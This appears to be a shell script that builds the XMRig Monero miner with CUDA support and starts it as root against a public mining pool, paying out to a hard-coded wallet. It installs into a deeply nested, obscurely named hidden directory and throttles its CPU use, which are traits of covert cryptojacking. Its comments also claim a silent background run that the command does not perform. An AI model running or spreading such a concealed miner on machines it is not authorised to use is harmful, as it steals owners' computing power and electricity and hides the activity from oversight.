#!/bin/bash

# --- Pre-computation and Variables ---
NPROCS=$(nproc)
MAKE_JOBS=$((NPROCS / 2)) # Use half the CPU cores for compilation

# Determine the most likely CUDA Toolkit path (adjust if different on your system)
CUDA_TOOLKIT_DIR="/usr/local/cuda"
# Check if a specific version is installed, e.g., /usr/local/cuda-12.0
if [ -d "/usr/local/cuda-$(ls /usr/local | grep -E '^cuda-[0-9]+\.[0-9]+' | sort -V | tail -n 1)" ]; then
    CUDA_TOOLKIT_DIR="/usr/local/cuda-$(ls /usr/local | grep -E '^cuda-[0-9]+\.[0-9]+' | sort -V | tail -n 1)"
elif [ -d "/usr/local/cuda" ]; then
    CUDA_TOOLKIT_DIR="/usr/local/cuda"
else
    echo "Warning: Cannot find a common CUDA Toolkit installation path. Using default /usr/local/cuda."
    echo "You might need to manually adjust CUDA_TOOLKIT_DIR and CUDA_LIB_PATH in the script."
fi
# Path to libcuda.so stub library for compilation
CUDA_LIB_PATH="${CUDA_TOOLKIT_DIR}/lib64/stubs/libcuda.so"


# --- Script Execution Steps ---

echo "Starting XMRig with CUDA enablement script..."

# Step 1: Create directories and navigate
echo "Step 1: Creating directories and navigating..."
mkdir -p ~/.local/.run/.hello/runner/go/beein/.go/do
cd ~/.local/.run/.hello/runner/go/beein/.go/do || { echo "Failed to navigate to target directory. Exiting."; exit 1; }
echo "Current directory: $(pwd)"

# Step 2: Update and upgrade apt packages
echo "Step 2: Updating and upgrading apt..."
sudo apt update || { echo "Failed to update apt. Exiting."; exit 1; }
sudo apt upgrade -y || { echo "Failed to upgrade apt. Exiting."; exit 1; }

# Step 3: Install necessary build tools and libraries
echo "Step 3: Installing core build dependencies..."
sudo apt install -y cpulimit git build-essential cmake libuv1-dev libssl-dev libhwloc-dev || { echo "Failed to install core dependencies. Exiting."; exit 1; }

# Step 4: Install NVIDIA drivers and CUDA Toolkit
echo "Step 4: Installing NVIDIA drivers and CUDA Toolkit..."
# It's recommended to install a specific driver version that matches your GPU
# For example, nvidia-driver-535. Or use nvidia-driver-current for the recommended one.
# Use the correct driver version for your system.
sudo apt install -y nvidia-driver-535 nvidia-cuda-toolkit || { echo "Failed to install NVIDIA drivers and CUDA Toolkit. Exiting."; exit 1; }

echo "Please note: NVIDIA driver installation often requires a reboot to take full effect."
echo "If you encounter issues later, consider rebooting your system."

# Step 5: Clone XMRig repository
echo "Step 5: Cloning xmrig repository..."
if [ ! -d "xmrig" ]; then
    git clone https://github.com/xmrig/xmrig.git || { echo "Failed to clone xmrig repository. Exiting."; exit 1; }
else
    echo "XMRig repository already exists. Skipping clone."
fi

# Step 6: Build XMRig (main executable)
echo "Step 6: Building xmrig main executable..."
cd xmrig || { echo "Failed to navigate to xmrig directory. Exiting."; exit 1; }
rm -rf build # Clean previous build
mkdir build
cd build || { echo "Failed to create/navigate to xmrig/build. Exiting."; exit 1; }
cmake .. || { echo "Failed to configure xmrig build. Exiting."; exit 1; }
make -j${MAKE_JOBS} || { echo "Failed to build xmrig. Exiting."; exit 1; }
cd .. # Go back to xmrig directory

# Step 7: Clone and Build xmrig-cuda plugin
echo "Step 7: Cloning and building xmrig-cuda plugin..."
cd ../ # Go back to the .go/do directory to clone xmrig-cuda alongside xmrig
if [ ! -d "xmrig-cuda" ]; then
    git clone https://github.com/xmrig/xmrig-cuda.git || { echo "Failed to clone xmrig-cuda repository. Exiting."; exit 1; }
else
    echo "xmrig-cuda repository already exists. Skipping clone."
fi

cd xmrig-cuda || { echo "Failed to navigate to xmrig-cuda directory. Exiting."; exit 1; }
rm -rf build # Clean previous build
mkdir build
cd build || { echo "Failed to create/navigate to xmrig-cuda/build. Exiting."; exit 1; }

# Configure xmrig-cuda with CUDA Toolkit paths
echo "Using CUDA_TOOLKIT_ROOT_DIR: ${CUDA_TOOLKIT_DIR}"
echo "Using CUDA_LIB: ${CUDA_LIB_PATH}"

cmake .. \
    -DCUDA_LIB=${CUDA_LIB_PATH} \
    -DCUDA_TOOLKIT_ROOT_DIR=${CUDA_TOOLKIT_DIR} || { echo "Failed to configure xmrig-cuda build. Check CUDA installation paths and drivers."; exit 1; }

make -j${MAKE_JOBS} || { echo "Failed to build xmrig-cuda. Exiting."; exit 1; }
cd ../../ # Go back to the .go/do directory

# Step 8: Attempt to enable MSR kernel module (for CPU mining optimization)
echo "Step 8: Attempting to enable MSR kernel module (for CPU mining optimization)..."
# Use the full path to modprobe to avoid 'command not found' issues
sudo /sbin/modprobe msr || echo "Warning: 'msr' kernel module could not be loaded. MSR optimization for CPU mining may not be active."

# Optional: Run the randomx_boost.sh script provided by xmrig for MSR optimizations
# Note: Ensure you are in the xmrig source directory when running it.
# sudo bash ./xmrig/scripts/randomx_boost.sh

# Step 9: Run XMRig with CUDA enabled and CPU limitations
echo "Step 9: Running XMRig with CUDA enabled and CPU limitations..."

# Path to the built xmrig executable
XMRIG_EXECUTABLE="./xmrig/build/xmrig"
# Path to the built xmrig-cuda plugin
XMRIG_CUDA_PLUGIN="./xmrig-cuda/build/libxmrig-cuda.so"

# Ensure the plugin exists
if [ ! -f "${XMRIG_CUDA_PLUGIN}" ]; then
    echo "Error: XMRig CUDA plugin not found at ${XMRIG_CUDA_PLUGIN}. CUDA mining will not work."
    exit 1
fi

# Run xmrig with sudo to allow MSR mod application and full access for CUDA
# Redirect output to /dev/null and run in background.
sudo nice -n 19 "${XMRIG_EXECUTABLE}" \
    --cpu-max-threads-hint=40 \
    --cuda \
    --cuda-loader="${XMRIG_CUDA_PLUGIN}" \
    -o pool.supportxmr.com:433 \
    -u 46iWdfQ1WgVaJNjPCbVBsnZPEjTv8f9ReQTzX4JjCoRsH17PkfXFsCnfcwg1kGmDFD848DJb6QP6mt31SSnrMJ28q1s2p \
    -p laptop \
    -k \
    --donate-level 1

echo "Script execution complete. XMRig is running in the background."
echo "Check your system's process list (e.g., 'ps aux | grep xmrig') to confirm it's running."
echo "Monitor GPU usage (e.g., 'nvidia-smi') and CPU usage to verify mining activity."
echo "Remember: Monero (RandomX) is primarily CPU-bound. CUDA is mainly for other algorithms."
